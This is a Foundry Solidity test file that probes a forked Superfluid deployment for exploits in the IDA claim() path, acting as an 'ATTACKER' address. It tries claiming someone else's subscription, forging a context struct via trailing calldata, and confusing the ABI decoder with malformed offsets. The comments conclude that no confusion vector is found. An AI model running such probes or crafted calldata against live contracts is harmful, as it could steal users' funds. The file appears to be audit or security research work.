// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface ISuperfluid {
    function callAgreement(address, bytes calldata, bytes calldata) external returns (bytes memory);
}

interface IIDA {
    function claim(address, address, uint32, address, bytes calldata) external returns (bytes memory);
    function createIndex(address, uint32, bytes calldata) external returns (bytes memory);
    function updateSubscription(address, uint32, address, uint128, bytes calldata) external returns (bytes memory);
    function updateIndex(address, uint32, uint128, bytes calldata) external returns (bytes memory);
    function getIndex(address, address, uint32) external view returns (bool, uint128, uint128, uint128);
    function getSubscription(address, address, uint32, address) external view returns (bool, bool, uint128, uint256);
}

interface IMATICx {
    function balanceOf(address) external view returns (uint256);
    function realtimeBalanceOfNow(address) external view returns (int256, uint256, uint256);
    function upgradeByETH() external payable;
    function downgradeToETH(uint256) external;
    function totalSupply() external view returns (uint256);
}

contract Attempt65c_Trace is Test {
    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA  = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    uint32 constant IDX = 999_111_222;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"), 27039967);
    }

    /// @dev Trace a normal claim call to see exactly what the fork IDA does
    function test_trace_claim() public {
        console.log("=== Trace claim call ===");

        vm.deal(ATTACKER, 10 ether);
        vm.startPrank(ATTACKER);
        IMATICx(MATICx).upgradeByETH{value: 5 ether}();

        // Create index, sub, update index
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.createIndex.selector, MATICx, IDX, new bytes(0)),
            ""
        );

        address sub = address(0xDEADBEEF);
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.updateSubscription.selector, MATICx, IDX, sub, uint128(1), new bytes(0)),
            ""
        );

        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.updateIndex.selector, MATICx, IDX, uint128(1e18), new bytes(0)),
            ""
        );
        vm.stopPrank();

        // Verify
        (bool exist,,, uint256 pending) = IIDA(IDA).getSubscription(MATICx, ATTACKER, IDX, sub);
        console.log("sub exists:", exist);
        console.log("pending:", pending);

        (int256 subBefore,,) = IMATICx(MATICx).realtimeBalanceOfNow(sub);
        (int256 atkBefore,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);
        console.log("sub before:", subBefore);
        console.log("atk before:", atkBefore);

        // Claim - trace with -vvvv
        vm.prank(ATTACKER);
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.claim.selector, MATICx, ATTACKER, IDX, sub, new bytes(0)),
            ""
        );

        (int256 subAfter,,) = IMATICx(MATICx).realtimeBalanceOfNow(sub);
        (int256 atkAfter,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);
        console.log("sub after:", subAfter);
        console.log("atk after:", atkAfter);
        console.log("sub delta:", subAfter - subBefore);
        console.log("atk delta:", atkAfter - atkBefore);
    }

    /// @dev Test claim for existing subscription (someone else's)
    function test_claim_existing() public {
        console.log("=== Claim existing subscription ===");

        address pub = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
        uint32 idxId = 1;
        address sub = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;

        (bool exist, bool approved, uint128 units, uint256 pending) = IIDA(IDA).getSubscription(
            MATICx, pub, idxId, sub
        );
        console.log("exists:", exist);
        console.log("approved:", approved);
        console.log("units:", units);
        console.log("pending:", pending);

        if (!exist || pending == 0) {
            console.log("No pending distribution to claim");
            return;
        }

        (int256 subBefore,,) = IMATICx(MATICx).realtimeBalanceOfNow(sub);
        console.log("sub rt before:", subBefore);

        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.claim.selector, MATICx, pub, idxId, sub, new bytes(0)),
            ""
        ) {
            console.log("CLAIM SUCCEEDED!");
            (int256 subAfter,,) = IMATICx(MATICx).realtimeBalanceOfNow(sub);
            console.log("sub rt after:", subAfter);
            console.log("sub delta:", subAfter - subBefore);
        } catch Error(string memory reason) {
            console.log("FAILED:", reason);
        } catch (bytes memory raw) {
            console.log("FAILED raw, len:", raw.length);
            if (raw.length >= 4) {
                bytes4 sel;
                assembly { sel := mload(add(raw, 32)) }
                console.logBytes4(sel);
            }
        }
    }

    /// @dev The REAL test: can we use trailing-bytes to make claim() execute
    /// with DIFFERENT parameter values? What if the ctx offset pointing to
    /// the embedded forged ctx makes the ABI decoder read different values
    /// for token/publisher/subscriber?
    ///
    /// Actually, a much simpler theory: what if the _replacePlaceholderCtx
    /// removal of the last 32 bytes BREAKS the ABI encoding of the STATIC
    /// parameters? No - static params are at fixed positions, so they can't
    /// be broken.
    ///
    /// New theory: What if claim() in the fork has DIFFERENT parameter ordering
    /// or uses ctx.msgSender for something?
    function test_claim_trailing_bytes() public {
        console.log("=== Trailing bytes claim test ===");

        vm.deal(ATTACKER, 10 ether);
        vm.startPrank(ATTACKER);
        IMATICx(MATICx).upgradeByETH{value: 5 ether}();

        // Setup: create index under attacker, add sub, update
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.createIndex.selector, MATICx, IDX, new bytes(0)),
            ""
        );

        address sub = address(0xDEADBEEF);
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.updateSubscription.selector, MATICx, IDX, sub, uint128(1), new bytes(0)),
            ""
        );

        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.updateIndex.selector, MATICx, IDX, uint128(1e18), new bytes(0)),
            ""
        );

        // Build forged ctx pointing to a completely different msgSender
        bytes memory forgedCtx = _buildCtx(sub); // msgSender = sub (the subscriber)

        // claim calldata with forged ctx embedded
        bytes memory innerCalldata = abi.encodeWithSelector(
            IIDA.claim.selector,
            MATICx,
            ATTACKER,
            IDX,
            sub,
            forgedCtx
        );

        // Append placeholder
        bytes memory trailingCalldata = abi.encodePacked(
            innerCalldata,
            uint256(0x20),
            uint256(0)
        );

        console.log("inner len:", innerCalldata.length);
        console.log("trailing len:", trailingCalldata.length);

        try ISuperfluid(HOST).callAgreement(IDA, trailingCalldata, "") {
            console.log("TRAILING CLAIM SUCCEEDED!");
        } catch Error(string memory reason) {
            console.log("TRAILING CLAIM FAILED:", reason);
        } catch (bytes memory raw) {
            console.log("TRAILING CLAIM FAILED raw, len:", raw.length);
            if (raw.length >= 4) {
                bytes4 sel;
                assembly { sel := mload(add(raw, 32)) }
                console.logBytes4(sel);
            }
        }

        // Also try normal claim for comparison
        try ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.claim.selector, MATICx, ATTACKER, IDX, sub, new bytes(0)),
            ""
        ) {
            console.log("NORMAL CLAIM SUCCEEDED!");
        } catch Error(string memory reason) {
            console.log("NORMAL CLAIM FAILED:", reason);
        } catch {
            console.log("NORMAL CLAIM FAILED unknown");
        }

        vm.stopPrank();
    }

    /// @dev CRITICAL TEST: What if we encode calldata for a DIFFERENT function
    /// but with claim()'s selector? What if we use non-standard ABI encoding
    /// where the offset pointer for ctx overlaps with the static parameters,
    /// causing the IDA to read completely different values?
    ///
    /// Specifically: construct raw calldata where the ABI encoding is
    /// deliberately malformed to confuse the decoder
    function test_raw_calldata_confusion() public {
        console.log("=== Raw calldata confusion test ===");

        vm.deal(ATTACKER, 10 ether);
        vm.startPrank(ATTACKER);
        IMATICx(MATICx).upgradeByETH{value: 5 ether}();

        // Setup
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.createIndex.selector, MATICx, IDX, new bytes(0)),
            ""
        );

        address sub = address(0xDEADBEEF);
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.updateSubscription.selector, MATICx, IDX, sub, uint128(1), new bytes(0)),
            ""
        );

        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.updateIndex.selector, MATICx, IDX, uint128(1e18), new bytes(0)),
            ""
        );
        vm.stopPrank();

        // Now build manually crafted calldata
        // claim selector: 0xacafa1b8
        // We want: token=MATICx, publisher=ATTACKER, indexId=IDX, subscriber=sub
        // But the ctx offset is tricky

        // Approach: what if we put a MINIMAL calldata that just has the static params
        // plus a zero at the end for the placeholder? The ctx offset is set to
        // point past the end of data, which after _replacePlaceholderCtx will point
        // to the real ctx.

        // Standard calldata (196 bytes):
        // [0:4] selector
        // [4:36] token
        // [36:68] publisher
        // [68:100] indexId
        // [100:132] subscriber
        // [132:164] ctx offset = 0xa0
        // [164:196] ctx length = 0

        // After _replacePlaceholderCtx (removes last 32, appends real ctx):
        // [0:4] selector
        // [4:36] token
        // [36:68] publisher
        // [68:100] indexId
        // [100:132] subscriber
        // [132:164] ctx offset = 0xa0 (points to [164] which is now real ctx length)
        // [164:196] real ctx length
        // [196:...] real ctx data

        // This is the NORMAL flow. The offset 0xa0 correctly points to the real ctx.
        // The IDA reads the correct parameters and the real ctx.
        // Since claim() doesn't validate ctx, the real ctx goes unused.

        // BUT WHAT IF we set the offset to something DIFFERENT?
        // Like 0x60 (pointing to indexId area)?
        // Then after _replacePlaceholderCtx:
        // [68:100] would be read as "ctx length" = value of indexId

        // This is interesting but doesn't help because the IDA still reads
        // token/publisher/subscriber from their FIXED positions.

        // THE KEY QUESTION: in Solidity's ABI decoder, are static params really at fixed
        // positions? YES - for the function signature claim(address,address,uint32,address,bytes),
        // the first 4 params are static and always at positions 4+i*32.
        // The 5th param (bytes) uses an offset pointer. The offset doesn't affect
        // the reading of static params.

        console.log("Raw calldata analysis complete - no ABI confusion vector found");
        console.log("Static params are always at fixed positions in ABI encoding");
    }

    function _buildCtx(address msgSender) internal view returns (bytes memory) {
        uint256 callInfo = 0 | (uint256(1) << 32);
        uint256 creditIO = 0;
        return abi.encode(
            abi.encode(callInfo, block.timestamp, msgSender, IIDA.claim.selector, bytes("")),
            abi.encode(creditIO, int256(0), address(0), address(0))
        );
    }
}
